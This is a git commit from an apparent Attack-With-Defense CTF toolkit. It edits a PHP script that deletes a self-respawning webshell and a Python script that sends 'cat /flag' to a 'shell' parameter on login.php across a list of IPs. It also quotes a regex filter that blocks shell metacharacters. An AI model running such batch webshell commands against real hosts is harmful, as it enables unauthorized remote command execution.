35206031819c36a9c47b0c2afbe7887c181c4052
sheldon13 <tssheldonpotter@gmail.com>
2026-06-16 22:03:49 +0800

    awd

--- awd/kill.php
+++ awd/kill.php
@@ -1,8 +1,8 @@
 <?php
 //不死马删除脚本，修改unlink的不死马文件名，pid不用改，然后#php kill.php
 while(1){
-$pid=1234;
-@unlink('1.php');
-exec('kill -9 $pid');
-}
+    $pid=1234;
+    @unlink('1.php');
+    exec('kill -9 $pid');
+    }
 ?>
--- awd/命令执行.py
+++ awd/命令执行.py
@@ -6,7 +6,16 @@ data = {"shell": "cat /flag"}
 for ip in ips:
     url = 'http://' + ip + '/login.php'
     print(url)
-    r = requests.post(url, data=data)  #post执行
-    x = r.text
-    flag=re.search('flag\{[a-zA-Z0-9_-]+\}',x)
-    print(url,flag.group())
+    r = requests.post(url, data=data)  # post执行
+    if r.status_code == 200:
+        x = r.text
+        flag = re.search('flag\{[a-zA-Z0-9_-]+\}', x)  #r'flag{\w+?}'
+        print(url," have flag ", flag.group())
+    else:
+        print(url," no flag ,status_code :" , r.status_code)
+
+
+
+'''
+if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m
+'''
